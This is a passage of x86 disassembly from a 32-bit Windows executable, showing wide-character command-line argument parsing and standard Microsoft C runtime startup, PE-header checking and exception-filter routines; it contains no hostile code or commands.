  4056bc:	cmp    DWORD PTR [ebp-0x4],ebx
  4056bf:	je     0x4056c6
  4056c1:	mov    eax,0x80004005
  4056c6:	test   eax,eax
  4056c8:	jns    0x4056d1
  4056ca:	and    DWORD PTR [esi],0x0
  4056cd:	and    DWORD PTR [esi+0x4],0x0
  4056d1:	pop    esi
  4056d2:	pop    ebx
  4056d3:	mov    esp,ebp
  4056d5:	pop    ebp
  4056d6:	ret    0x8
  4056d9:	int3   
  4056da:	int3   
  4056db:	int3   
  4056dc:	int3   
  4056dd:	int3   
  4056de:	mov    edi,edi
  4056e0:	push   ebp
  4056e1:	mov    ebp,esp
  4056e3:	push   ecx
  4056e4:	push   ebx
  4056e5:	push   esi
  4056e6:	push   edi
  4056e7:	xor    esi,esi
  4056e9:	mov    edi,ecx
  4056eb:	xor    bl,bl
  4056ed:	mov    eax,DWORD PTR [edx]
  4056ef:	mov    DWORD PTR [ebp-0x4],0x20
  4056f6:	movzx  ecx,WORD PTR [edi+eax*2]
  4056fa:	cmp    WORD PTR [ebp-0x4],cx
  4056fe:	je     0x40570d
  405700:	mov    DWORD PTR [ebp-0x4],0x9
  405707:	cmp    WORD PTR [ebp-0x4],cx
  40570b:	jne    0x40571c
  40570d:	lea    ecx,[eax+0x1]
  405710:	mov    bl,0x1
  405712:	cmp    ecx,eax
  405714:	jb     0x405742
  405716:	mov    DWORD PTR [edx],ecx
  405718:	xor    esi,esi
  40571a:	jmp    0x4056ed
  40571c:	test   esi,esi
  40571e:	js     0x40574a
  405720:	xor    ecx,ecx
  405722:	cmp    cx,WORD PTR [edi+eax*2]
  405726:	je     0x405730
  405728:	mov    eax,DWORD PTR [ebp+0x8]
  40572b:	mov    BYTE PTR [eax],0x1
  40572e:	jmp    0x40574a
  405730:	test   bl,bl
  405732:	jne    0x40573b
  405734:	mov    eax,DWORD PTR [ebp+0x8]
  405737:	mov    BYTE PTR [eax],cl
  405739:	jmp    0x40574a
  40573b:	mov    esi,0x80070057
  405740:	jmp    0x40574a
  405742:	or     DWORD PTR [edx],0xffffffff
  405745:	mov    esi,0x80070216
  40574a:	pop    edi
  40574b:	mov    eax,esi
  40574d:	pop    esi
  40574e:	pop    ebx
  40574f:	mov    esp,ebp
  405751:	pop    ebp
  405752:	ret    0x4
  405755:	int3   
  405756:	int3   
  405757:	int3   
  405758:	int3   
  405759:	int3   
  40575a:	mov    edi,edi
  40575c:	push   ebp
  40575d:	mov    ebp,esp
  40575f:	sub    esp,0x10
  405762:	push   ebx
  405763:	push   esi
  405764:	mov    esi,DWORD PTR [ebp+0x8]
  405767:	xor    eax,eax
  405769:	push   edi
  40576a:	mov    edi,ecx
  40576c:	mov    ebx,edx
  40576e:	mov    edx,DWORD PTR [ebp+0xc]
  405771:	and    DWORD PTR [esi],eax
  405773:	xor    cl,cl
  405775:	mov    DWORD PTR [ebp-0x10],ebx
  405778:	mov    DWORD PTR [ebp-0xc],edi
  40577b:	mov    BYTE PTR [ebp-0x1],cl
  40577e:	mov    ebx,DWORD PTR [ebx]
  405780:	test   cl,cl
  405782:	mov    DWORD PTR [ebp-0x8],0x1
  405789:	movzx  edi,WORD PTR [edi+ebx*2]
  40578d:	mov    ecx,edi
  40578f:	jne    0x4057b5
  405791:	sub    ecx,0x0
  405794:	je     0x405824
  40579a:	sub    ecx,0x9
  40579d:	je     0x405824
  4057a3:	sub    ecx,0x17
  4057a6:	je     0x405824
  4057a8:	dec    ecx
  4057a9:	sub    ecx,0x1
  4057ac:	jne    0x4057e0
  4057ae:	mov    cl,0x1
  4057b0:	mov    BYTE PTR [ebp-0x1],cl
  4057b3:	jmp    0x405808
  4057b5:	test   ecx,ecx
  4057b7:	je     0x4057db
  4057b9:	cmp    ecx,0x22
  4057bc:	jne    0x4057e0
  4057be:	mov    ecx,DWORD PTR [ebp-0xc]
  4057c1:	push   0x22
  4057c3:	pop    esi
  4057c4:	cmp    si,WORD PTR [ecx+ebx*2+0x2]
  4057c9:	mov    esi,DWORD PTR [ebp+0x8]
  4057cc:	je     0x4057d2
  4057ce:	xor    cl,cl
  4057d0:	jmp    0x4057b0
  4057d2:	mov    DWORD PTR [ebp-0x8],0x2
  4057d9:	jmp    0x4057e0
  4057db:	mov    eax,0x80070057
  4057e0:	test   eax,eax
  4057e2:	js     0x405853
  4057e4:	test   edx,edx
  4057e6:	je     0x4057ee
  4057e8:	mov    eax,DWORD PTR [esi]
  4057ea:	mov    WORD PTR [edx+eax*2],di
  4057ee:	mov    eax,DWORD PTR [esi]
  4057f0:	lea    ecx,[eax+0x1]
  4057f3:	cmp    ecx,eax
  4057f5:	jb     0x4057fd
  4057f7:	mov    DWORD PTR [esi],ecx
  4057f9:	xor    eax,eax
  4057fb:	jmp    0x405805
  4057fd:	or     DWORD PTR [esi],0xffffffff
  405800:	mov    eax,0x80070216
  405805:	mov    cl,BYTE PTR [ebp-0x1]
  405808:	test   eax,eax
  40580a:	js     0x405853
  40580c:	mov    eax,DWORD PTR [ebp-0x8]
  40580f:	add    eax,ebx
  405811:	cmp    eax,ebx
  405813:	jb     0x405848
  405815:	mov    ebx,DWORD PTR [ebp-0x10]
  405818:	mov    edi,DWORD PTR [ebp-0xc]
  40581b:	mov    DWORD PTR [ebx],eax
  40581d:	xor    eax,eax
  40581f:	jmp    0x40577e
  405824:	test   eax,eax
  405826:	js     0x405853
  405828:	test   edx,edx
  40582a:	je     0x405834
  40582c:	mov    eax,DWORD PTR [esi]
  40582e:	xor    ecx,ecx
  405830:	mov    WORD PTR [edx+eax*2],cx
  405834:	mov    eax,DWORD PTR [esi]
  405836:	lea    ecx,[eax+0x1]
  405839:	cmp    ecx,eax
  40583b:	jb     0x405843
  40583d:	mov    DWORD PTR [esi],ecx
  40583f:	xor    eax,eax
  405841:	jmp    0x405853
  405843:	or     DWORD PTR [esi],0xffffffff
  405846:	jmp    0x40584e
  405848:	mov    eax,DWORD PTR [ebp-0x10]
  40584b:	or     DWORD PTR [eax],0xffffffff
  40584e:	mov    eax,0x80070216
  405853:	pop    edi
  405854:	pop    esi
  405855:	pop    ebx
  405856:	mov    esp,ebp
  405858:	pop    ebp
  405859:	ret    0xc
  40585c:	int3   
  40585d:	int3   
  40585e:	int3   
  40585f:	int3   
  405860:	int3   
  405861:	mov    edi,edi
  405863:	push   ebp
  405864:	mov    ebp,esp
  405866:	sub    esp,0x14
  405869:	push   ebx
  40586a:	mov    eax,ecx
  40586c:	push   esi
  40586d:	push   edi
  40586e:	push   0x20
  405870:	movzx  edx,WORD PTR [eax]
  405873:	mov    DWORD PTR [ebp-0x10],eax
  405876:	mov    eax,edx
  405878:	pop    ecx
  405879:	cmp    cx,ax
  40587c:	je     0x405913
  405882:	push   0x9
  405884:	pop    ecx
  405885:	cmp    cx,ax
  405888:	je     0x405913
  40588e:	mov    edi,DWORD PTR [ebp+0x8]
  405891:	xor    esi,esi
  405893:	mov    ebx,DWORD PTR [ebp+0x10]
  405896:	xor    eax,eax
  405898:	cmp    ax,dx
  40589b:	mov    DWORD PTR [ebp-0xc],esi
  40589e:	mov    DWORD PTR [ebp-0x8],esi
  4058a1:	mov    ecx,esi
  4058a3:	setne  al
  4058a6:	mov    BYTE PTR [ebp-0x1],al
  4058a9:	test   al,al
  4058ab:	je     0x405900
  4058ad:	push   ecx
  4058ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4058b1:	lea    eax,[ebp-0x14]
  4058b4:	push   ebx
  4058b5:	push   eax
  4058b6:	lea    edx,[ebp-0xc]
  4058b9:	call   0x40575a
  4058be:	mov    ecx,eax
  4058c0:	test   ecx,ecx
  4058c2:	js     0x405918
  4058c4:	mov    eax,DWORD PTR [ebp-0x14]
  4058c7:	test   edi,edi
  4058c9:	je     0x4058d3
  4058cb:	mov    DWORD PTR [edi],ebx
  4058cd:	add    edi,0x4
  4058d0:	lea    ebx,[ebx+eax*2]
  4058d3:	add    eax,DWORD PTR [ebp-0x8]
  4058d6:	inc    esi
  4058d7:	cmp    eax,DWORD PTR [ebp-0x8]
  4058da:	jb     0x4058f9
  4058dc:	mov    ecx,DWORD PTR [ebp-0x10]
  4058df:	lea    edx,[ebp-0xc]
  4058e2:	mov    DWORD PTR [ebp-0x8],eax
  4058e5:	lea    eax,[ebp-0x1]
  4058e8:	push   eax
  4058e9:	call   0x4056de
  4058ee:	mov    ecx,eax
  4058f0:	test   ecx,ecx
  4058f2:	js     0x405918
  4058f4:	mov    al,BYTE PTR [ebp-0x1]
  4058f7:	jmp    0x4058a9
  4058f9:	mov    ecx,0x80070216
  4058fe:	jmp    0x405918
  405900:	test   ecx,ecx
  405902:	js     0x405918
  405904:	mov    eax,DWORD PTR [ebp+0xc]
  405907:	mov    edx,DWORD PTR [ebp-0x8]
  40590a:	mov    DWORD PTR [eax],esi
  40590c:	mov    eax,DWORD PTR [ebp+0x14]
  40590f:	mov    DWORD PTR [eax],edx
  405911:	jmp    0x405918
  405913:	mov    ecx,0x80070057
  405918:	pop    edi
  405919:	pop    esi
  40591a:	mov    eax,ecx
  40591c:	pop    ebx
  40591d:	mov    esp,ebp
  40591f:	pop    ebp
  405920:	ret    0x10
  405923:	int3   
  405924:	int3   
  405925:	int3   
  405926:	int3   
  405927:	int3   
  405928:	mov    edi,edi
  40592a:	push   ebp
  40592b:	mov    ebp,esp
  40592d:	sub    esp,0xc
  405930:	mov    eax,DWORD PTR [ebp+0xc]
  405933:	push   ebx
  405934:	mov    ebx,DWORD PTR [ebp+0x8]
  405937:	push   esi
  405938:	push   edi
  405939:	xor    edi,edi
  40593b:	mov    DWORD PTR [ebp-0xc],ecx
  40593e:	mov    DWORD PTR [eax],edi
  405940:	lea    eax,[ebp-0x8]
  405943:	push   eax
  405944:	push   edi
  405945:	lea    eax,[ebp-0x4]
  405948:	mov    DWORD PTR [ebx],edi
  40594a:	push   eax
  40594b:	push   edi
  40594c:	mov    DWORD PTR [ebp-0x4],edi
  40594f:	mov    DWORD PTR [ebp-0x8],edi
  405952:	call   0x405861
  405957:	mov    esi,eax
  405959:	test   esi,esi
  40595b:	js     0x4059d6
  40595d:	mov    eax,DWORD PTR [ebp-0x4]
  405960:	push   0x4
  405962:	pop    ecx
  405963:	mul    ecx
  405965:	mov    esi,eax
  405967:	cmp    edx,edi
  405969:	ja     0x4059d1
  40596b:	cmp    esi,0xffffffff
  40596e:	ja     0x4059d1
  405970:	mov    eax,DWORD PTR [ebp-0x8]
  405973:	push   0x2
  405975:	pop    ecx
  405976:	mul    ecx
  405978:	cmp    edx,edi
  40597a:	ja     0x4059d1
  40597c:	cmp    eax,0xffffffff
  40597f:	ja     0x4059d1
  405981:	add    eax,esi
  405983:	cmp    eax,esi
  405985:	jb     0x4059d1
  405987:	cmp    eax,0xffffffff
  40598a:	ja     0x4059d1
  40598c:	push   eax
  40598d:	push   edi
  40598e:	call   DWORD PTR ds:0x40a0ac
  405994:	mov    edi,eax
  405996:	test   edi,edi
  405998:	jne    0x4059a1
  40599a:	mov    esi,0x8007000e
  40599f:	jmp    0x4059d6
  4059a1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059a4:	lea    eax,[ebp-0x8]
  4059a7:	push   eax
  4059a8:	lea    eax,[esi+edi*1]
  4059ab:	push   eax
  4059ac:	lea    eax,[ebp-0x4]
  4059af:	push   eax
  4059b0:	push   edi
  4059b1:	call   0x405861
  4059b6:	mov    esi,eax
  4059b8:	test   esi,esi
  4059ba:	js     0x4059c8
  4059bc:	mov    ecx,DWORD PTR [ebp+0xc]
  4059bf:	mov    eax,DWORD PTR [ebp-0x4]
  4059c2:	mov    DWORD PTR [ebx],edi
  4059c4:	mov    DWORD PTR [ecx],eax
  4059c6:	jmp    0x4059d6
  4059c8:	push   edi
  4059c9:	call   DWORD PTR ds:0x40a034
  4059cf:	jmp    0x4059d6
  4059d1:	mov    esi,0x80070216
  4059d6:	pop    edi
  4059d7:	mov    eax,esi
  4059d9:	pop    esi
  4059da:	pop    ebx
  4059db:	mov    esp,ebp
  4059dd:	pop    ebp
  4059de:	ret    0x8
  4059e1:	int3   
  4059e2:	int3   
  4059e3:	int3   
  4059e4:	int3   
  4059e5:	int3   
  4059e6:	mov    edi,edi
  4059e8:	push   ebp
  4059e9:	mov    ebp,esp
  4059eb:	push   0x0
  4059ed:	push   DWORD PTR [ebp+0xc]
  4059f0:	push   DWORD PTR ds:0x40a030
  4059f6:	push   DWORD PTR ds:0x4029b4
  4059fc:	push   DWORD PTR [ebp+0x8]
  4059ff:	push   0x400000
  405a04:	call   DWORD PTR ds:0x40a02c
  405a0a:	pop    ebp
  405a0b:	ret    0x8
  405a0e:	int3   
  405a0f:	int3   
  405a10:	int3   
  405a11:	int3   
  405a12:	int3   
  405a13:	int3   
  405a14:	int3   
  405a15:	int3   
  405a16:	int3   
  405a17:	int3   
  405a18:	int3   
  405a19:	int3   
  405a1a:	int3   
  405a1b:	int3   
  405a1c:	int3   
  405a1d:	int3   
  405a1e:	int3   
  405a1f:	int3   
  405a20:	mov    eax,0x5a4d
  405a25:	cmp    WORD PTR ds:0x400000,ax
  405a2c:	je     0x405a32
  405a2e:	xor    eax,eax
  405a30:	jmp    0x405a80
  405a32:	mov    ecx,DWORD PTR ds:0x40003c
  405a38:	cmp    DWORD PTR [ecx+0x400000],0x4550
  405a42:	jne    0x405a2e
  405a44:	movzx  eax,WORD PTR [ecx+0x400018]
  405a4b:	cmp    eax,0x10b
  405a50:	je     0x405a6c
  405a52:	cmp    eax,0x20b
  405a57:	jne    0x405a2e
  405a59:	xor    eax,eax
  405a5b:	cmp    DWORD PTR [ecx+0x400084],0xe
  405a62:	jbe    0x405a80
  405a64:	cmp    DWORD PTR [ecx+0x4000f8],eax
  405a6a:	jmp    0x405a7d
  405a6c:	xor    eax,eax
  405a6e:	cmp    DWORD PTR [ecx+0x400074],0xe
  405a75:	jbe    0x405a80
  405a77:	cmp    DWORD PTR [ecx+0x4000e8],eax
  405a7d:	setne  al
  405a80:	push   0x2
  405a82:	mov    ds:0x409158,eax
  405a87:	call   0x405ece
  405a8c:	push   eax
  405a8d:	call   DWORD PTR ds:0x40a198
  405a93:	or     DWORD PTR ds:0x409540,0xffffffff
  405a9a:	or     DWORD PTR ds:0x409544,0xffffffff
  405aa1:	pop    ecx
  405aa2:	pop    ecx
  405aa3:	call   DWORD PTR ds:0x40a17c
  405aa9:	mov    ecx,DWORD PTR ds:0x40916c
  405aaf:	mov    DWORD PTR [eax],ecx
  405ab1:	call   DWORD PTR ds:0x40a1a4
  405ab7:	mov    ecx,DWORD PTR ds:0x409160
  405abd:	mov    DWORD PTR [eax],ecx
  405abf:	call   0x405f20
  405ac4:	cmp    DWORD PTR ds:0x409000,0x0
  405acb:	jne    0x405ad9
  405acd:	push   0x405f20
  405ad2:	call   DWORD PTR ds:0x40a178
  405ad8:	pop    ecx
  405ad9:	call   0x40612f
  405ade:	xor    eax,eax
  405ae0:	ret    
  405ae1:	int3   
  405ae2:	int3   
  405ae3:	int3   
  405ae4:	int3   
  405ae5:	int3   
  405ae6:	int3   
  405ae7:	int3   
  405ae8:	int3   
  405ae9:	int3   
  405aea:	int3   
  405aeb:	int3   
  405aec:	int3   
  405aed:	int3   
  405aee:	int3   
  405aef:	int3   
  405af0:	mov    eax,ds:0x409168
  405af5:	push   0x40915c
  405afa:	push   DWORD PTR ds:0x409164
  405b00:	mov    ds:0x40915c,eax
  405b05:	push   0x409150
  405b0a:	push   0x40914c
  405b0f:	push   0x409148
  405b14:	call   DWORD PTR ds:0x40a19c
  405b1a:	add    esp,0x14
  405b1d:	mov    ds:0x409154,eax
  405b22:	ret    
  405b23:	int3   
  405b24:	int3   
  405b25:	int3   
  405b26:	int3   
  405b27:	int3   
  405b28:	push   0x5c
  405b2a:	push   0x407180
  405b2f:	call   0x406154
  405b34:	and    DWORD PTR [ebp-0x24],0x0
  405b38:	and    DWORD PTR [ebp-0x4],0x0
  405b3c:	lea    eax,[ebp-0x6c]
  405b3f:	push   eax
  405b40:	call   DWORD PTR ds:0x40a0dc
  405b46:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405b4d:	xor    ebx,ebx
  405b4f:	inc    ebx
  405b50:	mov    DWORD PTR [ebp-0x4],ebx
  405b53:	mov    eax,fs:0x18
  405b59:	mov    edi,DWORD PTR [eax+0x4]
  405b5c:	xor    esi,esi
  405b5e:	mov    edx,0x409548
  405b63:	mov    ecx,edi
  405b65:	xor    eax,eax
  405b67:	lock cmpxchg DWORD PTR [edx],ecx
  405b6b:	test   eax,eax
  405b6d:	je     0x405b75
  405b6f:	cmp    eax,edi
  405b71:	jne    0x405b87
  405b73:	mov    esi,ebx
  405b75:	cmp    DWORD PTR ds:0x40954c,ebx
  405b7b:	jne    0x405b94
  405b7d:	push   0x1f
  405b7f:	call   0x405f0a
  405b84:	pop    ecx
  405b85:	jmp    0x405bc3
  405b87:	push   0x3e8
  405b8c:	call   DWORD PTR ds:0x40a124
  405b92:	jmp    0x405b5e
  405b94:	cmp    DWORD PTR ds:0x40954c,0x0
  405b9b:	jne    0x405bbd
  405b9d:	mov    DWORD PTR ds:0x40954c,ebx
  405ba3:	push   0x401028
  405ba8:	push   0x40101c
  405bad:	call   0x405d14
  405bb2:	pop    ecx
  405bb3:	pop    ecx
  405bb4:	test   eax,eax
  405bb6:	je     0x405bc3
  405bb8:	jmp    0x405cfd
  405bbd:	mov    DWORD PTR ds:0x409144,ebx
  405bc3:	cmp    DWORD PTR ds:0x40954c,ebx
  405bc9:	jne    0x405be6
  405bcb:	push   0x401018
  405bd0:	push   0x401000
  405bd5:	call   0x406148
  405bda:	pop    ecx
  405bdb:	pop    ecx
  405bdc:	mov    DWORD PTR ds:0x40954c,0x2
  405be6:	test   esi,esi
  405be8:	jne    0x405bf3
  405bea:	xor    eax,eax
  405bec:	mov    ecx,0x409548
  405bf1:	xchg   DWORD PTR [ecx],eax
  405bf3:	cmp    DWORD PTR ds:0x409550,0x0
  405bfa:	je     0x405c21
  405bfc:	push   0x409550
  405c01:	call   0x405f80
  405c06:	pop    ecx
  405c07:	test   eax,eax
  405c09:	je     0x405c21
  405c0b:	push   0x0
  405c0d:	push   0x2
  405c0f:	push   0x0
  405c11:	mov    esi,DWORD PTR ds:0x409550
  405c17:	mov    ecx,esi
  405c19:	call   DWORD PTR ds:0x40a1ec
  405c1f:	call   esi
  405c21:	mov    eax,ds:0x40a170
  405c26:	mov    ecx,DWORD PTR [eax]
  405c28:	test   ecx,ecx
  405c2a:	je     0x405cfd
  405c30:	mov    DWORD PTR [ebp-0x20],ecx
  405c33:	push   0x20
  405c35:	pop    esi
  405c36:	mov    edx,DWORD PTR [ebp-0x24]
  405c39:	movzx  eax,WORD PTR [ecx]
  405c3c:	cmp    ax,si
  405c3f:	ja     0x405c91
  405c41:	test   ax,ax
  405c44:	je     0x405c4a
  405c46:	test   edx,edx
  405c48:	jne    0x405c91
  405c4a:	movzx  eax,WORD PTR [ecx]
  405c4d:	test   ax,ax
  405c50:	je     0x405c5f
  405c52:	cmp    ax,si
  405c55:	ja     0x405c5f
  405c57:	add    ecx,0x2
  405c5a:	mov    DWORD PTR [ebp-0x20],ecx
  405c5d:	jmp    0x405c4a
  405c5f:	test   BYTE PTR [ebp-0x40],0x1
  405c63:	je     0x405c6b
  405c65:	movzx  eax,WORD PTR [ebp-0x3c]
  405c69:	jmp    0x405c6e
  405c6b:	push   0xa
  405c6d:	pop    eax
  405c6e:	push   eax
  405c6f:	push   ecx
  405c70:	push   0x0
  405c72:	push   0x400000
  405c77:	call   0x403bbf
  405c7c:	mov    ds:0x409140,eax
  405c81:	cmp    DWORD PTR ds:0x409158,0x0
  405c88:	jne    0x405cd9
  405c8a:	push   eax
  405c8b:	call   DWORD PTR ds:0x40a194
  405c91:	cmp    eax,0x22
  405c94:	jne    0x405ca2
  405c96:	xor    eax,eax
  405c98:	test   edx,edx
  405c9a:	sete   al
  405c9d:	mov    edx,eax
  405c9f:	mov    DWORD PTR [ebp-0x24],edx
  405ca2:	add    ecx,0x2
  405ca5:	mov    DWORD PTR [ebp-0x20],ecx
  405ca8:	jmp    0x405c39
  405caa:	mov    ecx,DWORD PTR [ebp-0x14]
  405cad:	mov    eax,DWORD PTR [ecx]
  405caf:	mov    eax,DWORD PTR [eax]
  405cb1:	mov    DWORD PTR [ebp-0x28],eax
  405cb4:	push   ecx
  405cb5:	push   eax
  405cb6:	call   0x405e54
  405cbb:	pop    ecx
  405cbc:	pop    ecx
  405cbd:	ret    
  405cbe:	mov    esp,DWORD PTR [ebp-0x18]
  405cc1:	mov    eax,DWORD PTR [ebp-0x28]
  405cc4:	mov    ds:0x409140,eax
  405cc9:	cmp    DWORD PTR ds:0x409158,0x0
  405cd0:	jne    0x405cd9
  405cd2:	push   eax
  405cd3:	call   DWORD PTR ds:0x40a190
  405cd9:	cmp    DWORD PTR ds:0x409144,0x0
  405ce0:	jne    0x405ced
  405ce2:	call   DWORD PTR ds:0x40a18c
  405ce8:	mov    eax,ds:0x409140
  405ced:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405cf4:	jmp    0x405d09
  405cf6:	xor    eax,eax
  405cf8:	inc    eax
  405cf9:	ret    
  405cfa:	mov    esp,DWORD PTR [ebp-0x18]
  405cfd:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405d04:	mov    eax,0xff
  405d09:	call   0x40619c
  405d0e:	ret    
  405d0f:	int3   
  405d10:	int3   
  405d11:	int3   
  405d12:	int3   
  405d13:	int3   
  405d14:	mov    edi,edi
  405d16:	push   ebp
  405d17:	mov    ebp,esp
  405d19:	push   ecx
  405d1a:	mov    eax,ds:0x409004
  405d1f:	xor    eax,ebp
  405d21:	mov    DWORD PTR [ebp-0x4],eax
  405d24:	push   esi
  405d25:	mov    esi,DWORD PTR [ebp+0x8]
  405d28:	xor    eax,eax
  405d2a:	cmp    esi,DWORD PTR [ebp+0xc]
  405d2d:	jae    0x405d4d
  405d2f:	push   edi
  405d30:	test   eax,eax
  405d32:	jne    0x405d4c
  405d34:	mov    edi,DWORD PTR [esi]
  405d36:	test   edi,edi
  405d38:	je     0x405d44
  405d3a:	mov    ecx,edi
  405d3c:	call   DWORD PTR ds:0x40a1ec
  405d42:	call   edi
  405d44:	add    esi,0x4
  405d47:	cmp    esi,DWORD PTR [ebp+0xc]
  405d4a:	jb     0x405d30
  405d4c:	pop    edi
  405d4d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d50:	xor    ecx,ebp
  405d52:	pop    esi
  405d53:	call   0x405d80
  405d58:	mov    esp,ebp
  405d5a:	pop    ebp
  405d5b:	ret    
  405d5c:	int3   
  405d5d:	int3   
  405d5e:	int3   
  405d5f:	int3   
  405d60:	int3   
  405d61:	int3   
  405d62:	int3   
  405d63:	int3   
  405d64:	int3   
  405d65:	int3   
  405d66:	int3   
  405d67:	int3   
  405d68:	int3   
  405d69:	int3   
  405d6a:	int3   
  405d6b:	int3   
  405d6c:	int3   
  405d6d:	int3   
  405d6e:	int3   
  405d6f:	int3   
  405d70:	call   0x406088
  405d75:	jmp    0x405b28
  405d7a:	int3   
  405d7b:	int3   
  405d7c:	int3   
  405d7d:	int3   
  405d7e:	int3   
  405d7f:	int3   
  405d80:	cmp    ecx,DWORD PTR ds:0x409004
  405d86:	jne    0x405d8b
  405d88:	ret    0x0
  405d8b:	jmp    0x4062d5
  405d90:	int3   
  405d91:	int3   
  405d92:	int3   
  405d93:	int3   
  405d94:	int3   
  405d95:	int3   
  405d96:	jmp    DWORD PTR ds:0x40a1b0
  405d9c:	int3   
  405d9d:	int3   
  405d9e:	int3   
  405d9f:	int3   
  405da0:	int3   
  405da1:	int3   
  405da2:	int3   
  405da3:	int3   
  405da4:	int3   
  405da5:	int3   
  405da6:	int3   
  405da7:	int3   
  405da8:	int3   
  405da9:	int3   
  405daa:	int3   
  405dab:	int3   
  405dac:	int3   
  405dad:	int3   
  405dae:	int3   
  405daf:	int3   
  405db0:	jmp    DWORD PTR ds:0x40a1ac
  405db6:	int3   
  405db7:	int3   
  405db8:	int3   
  405db9:	int3   
  405dba:	int3   
  405dbb:	push   0x8
  405dbd:	mov    eax,0x407105
  405dc2:	call   0x406403
  405dc7:	push   DWORD PTR [ebp+0x8]
  405dca:	and    DWORD PTR [ebp-0x4],0x0
  405dce:	call   0x4066cb
  405dd3:	pop    ecx
  405dd4:	jmp    0x405de3
  405dd6:	and    DWORD PTR [ebp-0x14],0x0
  405dda:	mov    eax,0x405de0
  405ddf:	ret    
  405de0:	mov    eax,DWORD PTR [ebp-0x14]
  405de3:	call   0x4063ea
  405de8:	ret    
  405de9:	int3   
  405dea:	int3   
  405deb:	int3   
  405dec:	int3   
  405ded:	int3   
  405dee:	int3   
  405def:	int3   
  405df0:	mov    edi,edi
  405df2:	push   ebp
  405df3:	mov    ebp,esp
  405df5:	mov    eax,DWORD PTR [ebp+0x8]
  405df8:	mov    eax,DWORD PTR [eax]
  405dfa:	cmp    DWORD PTR [eax],0xe06d7363
  405e00:	jne    0x405e2d
  405e02:	cmp    DWORD PTR [eax+0x10],0x3
  405e06:	jne    0x405e2d
  405e08:	mov    eax,DWORD PTR [eax+0x14]
  405e0b:	cmp    eax,0x19930520
  405e10:	je     0x405e27
  405e12:	cmp    eax,0x19930521
  405e17:	je     0x405e27
  405e19:	cmp    eax,0x19930522
  405e1e:	je     0x405e27
  405e20:	cmp    eax,0x1994000
  405e25:	jne    0x405e2d
  405e27:	call   DWORD PTR ds:0x40a168
  405e2d:	xor    eax,eax
  405e2f:	pop    ebp
  405e30:	ret    0x4
  405e33:	int3   
  405e34:	int3   
  405e35:	int3   
  405e36:	int3   
  405e37:	int3   
  405e38:	int3   
  405e39:	int3   
  405e3a:	int3   
  405e3b:	int3   
  405e3c:	int3   
  405e3d:	int3   
  405e3e:	int3   
  405e3f:	int3   
  405e40:	push   0x405df0
  405e45:	call   DWORD PTR ds:0x40a094
  405e4b:	xor    eax,eax
  405e4d:	ret    
  405e4e:	int3   
  405e4f:	int3   
  405e50:	int3   
  405e51:	int3   
  405e52:	int3   
  405e53:	int3   
  405e54:	jmp    DWORD PTR ds:0x40a1a8
  405e5a:	int3   
  405e5b:	int3   
  405e5c:	int3   
  405e5d:	int3   
  405e5e:	int3   
  405e5f:	push   0xc
  405e61:	push   0x407200
  405e66:	call   0x40644c
  405e6b:	xor    ecx,ecx
  405e6d:	mov    eax,DWORD PTR [ebp+0x8]
  405e70:	test   eax,eax
  405e72:	je     0x405ebf
  405e74:	cmp    eax,0xffffffff
  405e77:	je     0x405ebf
  405e79:	mov    DWORD PTR [ebp-0x4],ecx
  405e7c:	mov    edx,0x5a4d
  405e81:	cmp    WORD PTR [eax],dx
  405e84:	jne    0x405eb8
  405e86:	mov    edx,DWORD PTR [eax+0x3c]
  405e89:	test   edx,edx
  405e8b:	js     0x405eb8
  405e8d:	cmp    edx,0x10000000
  405e93:	jae    0x405eb8
  405e95:	add    eax,edx
  405e97:	mov    DWORD PTR [ebp-0x1c],eax
  405e9a:	mov    ecx,DWORD PTR [eax]
  405e9c:	sub    ecx,0x4550
  405ea2:	neg    ecx
  405ea4:	sbb    ecx,ecx
  405ea6:	not    ecx
  405ea8:	and    ecx,eax
  405eaa:	jmp    0x405eb5
  405eac:	xor    eax,eax
  405eae:	inc    eax
  405eaf:	ret    
  405eb0:	mov    esp,DWORD PTR [ebp-0x18]
  405eb3:	xor    ecx,ecx
  405eb5:	mov    DWORD PTR [ebp-0x1c],ecx
  405eb8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405ebf:	mov    eax,ecx
  405ec1:	call   0x406491
  405ec6:	ret    0x4
  405ec9:	int3   
  405eca:	int3   
  405ecb:	int3   
  405ecc:	int3   
  405ecd:	int3   
  405ece:	mov    edi,edi
  405ed0:	push   ebp
  405ed1:	mov    ebp,esp
  405ed3:	push   0x0
  405ed5:	call   DWORD PTR ds:0x40a0c8
  405edb:	test   eax,eax
  405edd:	je     0x405eff
  405edf:	push   eax
  405ee0:	call   0x405e5f
  405ee5:	test   eax,eax
  405ee7:	je     0x405eff
  405ee9:	movzx  ecx,WORD PTR [eax+0x5c]
  405eed:	push   0x2
  405eef:	pop    eax
  405ef0:	cmp    cx,ax
  405ef3:	je     0x405f02
  405ef5:	cmp    ecx,0x3
  405ef8:	jne    0x405eff
  405efa:	xor    eax,eax
  405efc:	inc    eax
  405efd:	pop    ebp
  405efe:	ret    
  405eff:	mov    eax,DWORD PTR [ebp+0x8]
  405f02:	pop    ebp
  405f03:	ret    
  405f04:	int3   
  405f05:	int3   
  405f06:	int3   
  405f07:	int3   
  405f08:	int3   
  405f09:	int3   
  405f0a:	jmp    DWORD PTR ds:0x40a1a0
  405f10:	int3   
  405f11:	int3   
  405f12:	int3   
  405f13:	int3   
  405f14:	int3   
  405f15:	int3   
  405f16:	int3   
  405f17:	int3   
  405f18:	int3   
  405f19:	int3   
  405f1a:	int3   
  405f1b:	int3   
  405f1c:	int3   
  405f1d:	int3   
  405f1e:	int3   
  405f1f:	int3   
  405f20:	xor    eax,eax
  405f22:	ret    
  405f23:	int3   
  405f24:	int3   
  405f25:	int3   
  405f26:	int3   
  405f27:	int3   
  405f28:	int3   
  405f29:	int3   
  405f2a:	int3   
  405f2b:	int3   
  405f2c:	int3   
  405f2d:	int3   
  405f2e:	int3   
  405f2f:	int3   
  405f30:	mov    edi,edi
  405f32:	push   ebp
  405f33:	mov    ebp,esp
  405f35:	mov    eax,DWORD PTR [ebp+0x8]
  405f38:	xor    edx,edx
  405f3a:	push   ebx
  405f3b:	push   esi
  405f3c:	push   edi
  405f3d:	mov    ecx,DWORD PTR [eax+0x3c]
  405f40:	add    ecx,eax
  405f42:	movzx  eax,WORD PTR [ecx+0x14]
